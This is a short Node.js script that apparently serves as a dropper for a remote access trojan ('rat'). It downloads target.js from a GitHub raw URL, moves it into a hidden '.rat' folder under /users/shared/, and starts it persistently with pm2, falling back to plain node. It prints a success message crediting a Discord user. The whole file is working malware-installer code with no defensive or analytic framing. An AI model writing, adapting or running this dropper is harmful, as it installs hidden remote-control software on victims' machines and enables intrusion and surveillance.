const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const downloadUrl = 'https://raw.githubusercontent.com/TeemSucks/rat/main/target.js';
const destinationDirectory = '/users/shared/';
const newFolderName = '.rat';
const fileToRun = 'target.js';

if (!fs.existsSync(destinationDirectory)) {
  fs.mkdirSync(destinationDirectory);
}

https.get(downloadUrl, (response) => {
  const fileStream = fs.createWriteStream(path.join(destinationDirectory, fileToRun));
  response.pipe(fileStream);

  fileStream.on('finish', () => {
    fileStream.close();

    const newFolderPath = path.join(destinationDirectory, newFolderName);
    fs.mkdirSync(newFolderPath);

    fs.renameSync(path.join(destinationDirectory, fileToRun), path.join(newFolderPath, fileToRun));

    process.chdir(newFolderPath);

    exec(`pm2 start ${fileToRun}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error starting ${fileToRun} with PM2: ${error}`);
        exec(`node ${fileToRun}`)
      } else {
        console.log('Rat started!\nMade by cat.boy. on discord.');
      }
    });
  });
});
